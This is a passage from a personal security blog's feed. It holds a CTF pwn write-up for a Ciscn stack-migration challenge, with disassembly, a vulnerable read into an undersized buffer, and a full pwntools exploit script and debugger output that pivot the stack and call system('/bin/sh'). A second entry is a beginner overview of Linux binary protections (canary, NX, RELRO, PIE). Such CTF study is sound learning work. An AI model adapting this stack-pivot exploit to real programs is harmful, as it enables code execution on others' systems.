punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argc            <span class="token operator">=</span> dword ptr  <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argv            <span class="token operator">=</span> dword ptr  0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> envp            <span class="token operator">=</span> dword ptr  10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048603</span>                 and     esp<span class="token punctuation">,</span> 0FFFFFFF0h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048606</span>                 push    dword ptr <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048609</span>                 push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860A                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860C                 push    ecx<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860D                 sub     esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048610</span>                 call    init<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048615</span>                 sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048618</span>                 push    offset s        <span class="token punctuation">;</span> <span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804861D                 call    _puts<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048622</span>                 add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048625</span>                 call    vul<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804862A                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804862F</span>                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048632</span>                 leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048633</span>                 lea     esp<span class="token punctuation">,</span> <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span>                 retn<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// starts at 80485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> main            endp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>vul:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Status‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ REGISTERS ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ EAX  0x30 EBX  0x0 ECX  0xfff9442c ‚óÇ‚Äî 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 ‚óÇ‚Äî 0x0 EDI  0xf7ee1000 ‚óÇ‚Äî 0x1d9d6c ESI  0xf7ee1000 ‚óÇ‚Äî 0x1d9d6c EBP  0xfff969a8 ‚Äî‚ñ∏ 0x804af00 ‚óÇ‚Äî 0x0 ESP  0xfff96980 ‚óÇ‚Äî 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) ‚óÇ‚Äî leave  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     ‚ñ∫ 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebp‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ00:0000‚îÇ esp  0xfff96980 ‚óÇ‚Äî 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ‚Üì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚ñ∫ f 0  80485fd vul+104‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄBreakpoint *vul+104pwndbg> stack 2000:0000‚îÇ esp  0xfff96980 ‚óÇ‚Äî 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ‚Üì0a:0028‚îÇ ebp  0xfff969a8 ‚Äî‚ñ∏ 0x804af00 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xfff969ac ‚Äî‚ñ∏ 0x804859b (vul+6) ‚óÇ‚Äî sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000‚îÇ esp  0x804aed8 ‚Äî‚ñ∏ 0x8048400 (system@plt) ‚óÇ‚Äî jmp    dword ptr [0x804a018]01:0004‚îÇ      0x804aedc ‚óÇ‚Äî 0x002:0008‚îÇ      0x804aee0 ‚Äî‚ñ∏ 0x804aee8 ‚óÇ‚Äî '/bin/sh'03:000c‚îÇ      0x804aee4 ‚óÇ‚Äî 0x004:0010‚îÇ      0x804aee8 ‚óÇ‚Äî '/bin/sh'05:0014‚îÇ      0x804aeec ‚óÇ‚Äî 0x68732f /* '/sh' */06:0018‚îÇ      0x804aef0 ‚óÇ‚Äî 0x0... ‚Üì0a:0028‚îÇ      0x804af00 ‚Äî‚ñ∏ 0x804aed4 ‚óÇ‚Äî 0x00b:002c‚îÇ      0x804af04 ‚Äî‚ñ∏ 0x80484b8 (deregister_tm_clones+40) ‚óÇ‚Äî leave  0c:0030‚îÇ      0x804af08 ‚óÇ‚Äî 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>MindÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719201500.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Stack migration in Ciscn‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="Ciscn" scheme="http://www.yof3ng.xyz/tags/Ciscn/"/>
    
  </entry>
  
  <entry>
    <title>Binary_Security_Guidance</title>
    <link href="http://www.yof3ng.xyz/2019/07/18/Binary-Security-Guidance/"/>
    <id>http://www.yof3ng.xyz/2019/07/18/Binary-Security-Guidance/</id>
    <published>2019-07-18T06:08:39.000Z</published>
    <updated>2019-07-18T08:20:52.906Z</updated>
    
    <content type="html"><![CDATA[<p>Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specificallyüòÑ.</p><a id="more"></a><p>[TOC]</p><h1 id="‚úâBinary-Security-Guidance"><a href="#‚úâBinary-Security-Guidance" class="headerlink" title="‚úâBinary_Security_Guidance"></a>‚úâBinary_Security_Guidance</h1><blockquote><p>Binary security refers to guaranteeing the information security of binary data when transmitting data, that is, not being tampered with, decoded and so on. If attacked, it can be detected in time.</p><p>Binary security includes some things of cryptography, such as encryption and decryption, signature and so on.</p><p>In <code>CTF</code> competitions, binary security usually appear in the form of <code>reverse</code> and <code>pwn</code>. You will get a compiled program to analyze its logic and then crack it.</p></blockquote><h2 id="üìñLinux-Pwn"><a href="#üìñLinux-Pwn" class="headerlink" title="üìñLinux Pwn"></a>üìñLinux Pwn</h2><blockquote><p>Cause pwn of linux is normally favorite example form now. So i decide to start pwn from linux platform.</p></blockquote><h3 id="Security-protection-mechanism"><a href="#Security-protection-mechanism" class="headerlink" title="Security protection mechanism"></a>Security protection mechanism</h3><blockquote><p>In the linux, we can use instructions called <code>checksec</code> to see the security protection mechanism of our target program. So the first we should know is kinds of protection mechanism.</p></blockquote><p> <img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718144432.png" alt=""></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><blockquote><p>Canary is a kind of protection technique to mitigate stack overflow.</p><p>You can set the canary by following args.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#Quoted From CTF-WIKI</span><span class="token comment" spellcheck="true">#enables protection, but only inserts protection for functions that have arrays in local variables</span>-fstack-protector <span class="token comment" spellcheck="true">#Enable protection, insert protection for all functions</span>-fstack-protector-all -fstack-protector-strong<span class="token comment" spellcheck="true">#Only protects functions with explicit stack_protect attribute</span>-fstack-protector-explicit <span class="token comment" spellcheck="true">#Disable protection.</span>-fno-stack-protector </code></pre><p>Here is a example to understand what role canary play.</p><pre class=" language-bash"><code class="language-bash">        High        Address <span class="token operator">|</span>                 <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> args            <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>                +-----------------+        rbp <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>                +-----------------+      rbp-8 <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>                +-----------------+<span class="token operator">|</span> Local variables <span class="token operator">|</span>        Low     <span class="token operator">|</span>                 <span class="token operator">|</span>        Address</code></pre><p>The canary value is usually stored in <code>TLS==&gt;fs:[0x28]</code>, this value is also called <code>stack_guard</code>. If the canary value was changed illegally, the program flow will go to a func called <code>__stack_chk_fail</code> in glibc. And then you can‚Äôt crack the program as you think, it will prevent the easy stack overflow.(PS: Bypass Canary will be talked later‚Ä¶)</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><blockquote><p>Nx(No Excute) enabled means instructions in stack won‚Äôt be allowed to execute. Normally attack ways like <code>call esp</code> and <code>jmp esp</code> will out of action. But we can use ROP technique to bypass NX. </p></blockquote><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><blockquote><p>RELRO, this kind of protection mechanism has two form: <code>Partial RELRO</code> and <code>Full RELRO</code>. If program was Full RELRO, we wouldn‚Äôt change the <code>Got-table</code>.</p></blockquote><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><blockquote><p>PIEÔºàposition-independent executableÔºâ enabled means program‚Äôs memory address is random while running the program each time.</p><p>The basic address is 0x400000 when program‚Äôs status is <code>No-PIE</code>.</p></blockquote><h4 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h4><blockquote><p>Has RWX(Read&amp;Write&amp;Execute) segments means program has some segments you have the power to read, write and execute.</p><p>You can try to understand it by following picture:</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718153217.png" alt=""></p><h3 id="Common-Attack-Ways"><a href="#Common-Attack-Ways" class="headerlink" title="Common Attack Ways"></a>Common Attack Ways</h3><blockquote><p>So what we should learn then? It‚Äôs no denying we should aim at understanding basic principles of common attack ways. </p></blockquote><ul><li>Stack overflow</li><li>Format string vulnerability</li><li>Glibc Heap uses</li><li>IO_FILE uses</li><li>Conditional competition</li><li>Integer overflow</li><li>Sandbox escape</li><li>Linux Kernel</li><li>Others Framework(like arm,arch)</li></ul><h2 id="üìñReverse"><a href="#üìñReverse" class="headerlink" title="üìñReverse"></a>üìñReverse</h2><p>later‚Ä¶</p><h2 id="‚è±Concluding-remarks"><a href="#‚è±Concluding-remarks" class="headerlink" title="‚è±Concluding remarks"></a>‚è±Concluding remarks</h2><p>Fighting or losing, depend on yourselfüòÄ.</p>]]></content>
    
    <summary type="html">
    
